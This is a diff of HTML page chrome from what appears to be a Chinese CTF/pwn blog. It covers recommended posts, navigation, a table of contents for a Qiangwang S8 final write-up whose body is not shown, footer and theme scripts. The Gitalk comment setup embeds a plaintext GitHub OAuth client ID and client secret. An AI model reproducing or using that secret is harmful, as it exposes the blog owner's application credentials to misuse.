+    <div class="recommended-article-group"><a class="recommended-article-item" href="/202405/19/ciscn-2024/" title="ciscn-2024" rel="bookmark">
+  <img src="/img/cover/2.png" alt="ciscn-2024" class="!max-w-none">
+  <span class="title">ciscn-2024</span>
+</a><a class="recommended-article-item" href="/202411/28/WangDing-2024/" title="WangDing-2024" rel="bookmark">
+  <img src="/img/cover/12.png" alt="WangDing-2024" class="!max-w-none">
+  <span class="title">WangDing-2024</span>
+</a><a class="recommended-article-item" href="/202412/17/ciscn-2025-初赛/" title="ciscn-2025-初赛" rel="bookmark">
+  <img src="/img/cover/3.jpg" alt="ciscn-2025-初赛" class="!max-w-none">
+  <span class="title">ciscn-2025-初赛</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>绝赞文章</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/202405/19/ciscn-2024/" title="ciscn-2024" rel="bookmark">
+  <img src="/img/cover/2.png" alt="ciscn-2024" class="!max-w-none">
+  <span class="title">ciscn-2024</span>
+</a><a class="recommended-article-item" href="/202411/28/WangDing-2024/" title="WangDing-2024" rel="bookmark">
+  <img src="/img/cover/12.png" alt="WangDing-2024" class="!max-w-none">
+  <span class="title">WangDing-2024</span>
+</a></div>
+   </div>
+  </div>
 
-  if ('Gitalk' === 'Gitalk' || !false) {
-    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
-    else loadGitalk()
-  } else {
-    window.loadOtherComment = loadGitalk
-  }
-})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
-        <style>
-            [bg-lazy] {
-                background-image: none !important;
-                background-color: #eee !important;
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/202412/17/ciscn-2025-%E5%88%9D%E8%B5%9B/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">ciscn-2025-初赛</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/202412/03/PlaidCTF-roll-a-d8/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">PlaidCTF-roll-a-d8</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
             }
-        </style>
-        <script>
-            window.imageLazyLoadSetting = {
-                isSPA: false,
-                preloadRatio: 1,
-                processImages: null,
-            };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: 'Ov23liHYhg6LHlT1ThOv',
+                    clientSecret: '415cc417d0d49a393d00a126e54748a82ccc28ab',
+                    repo: 'blog_comment',
+                    owner: 'InkeyP',
+                    admin: ['InkeyP'],
+                    id: __gitalk__pathname,
+                    language: 'zh-CN',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">强网S8-final-JP</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91S8-final-WP"><span class="nav-text">强网S8 final WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#heap"><span class="nav-text">heap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-heap"><span class="nav-text">ez_heap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#qvm"><span class="nav-text">qvm</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">梦想是成为PWN糕手</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">InkeyP</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 12 篇文章
+                    </span>
+                    
+                        <span>
+                            共 20.8k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/categoryList.js" ></script>
+
+
+    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/localSearch.js" ></script>
+
+
+
+    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/codeBlock.js" ></script>
+
+
+
+    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/lazyload.js" ></script>
+
+
+
+    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/runtime.js" ></script>
+    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/odometer.min.js" ></script>
+    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Typed.min.js" ></script>
+  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/typed.js" ></script>
+
+
+
+
+
+
+
+    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/anime.min.js" ></script>
+
+
+
+
+    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>
+
+
+<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
+<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>
+
+
+    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/pangu.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/pangu.js" ></script>
+
+
+
+	
+</body>
+
+</html>
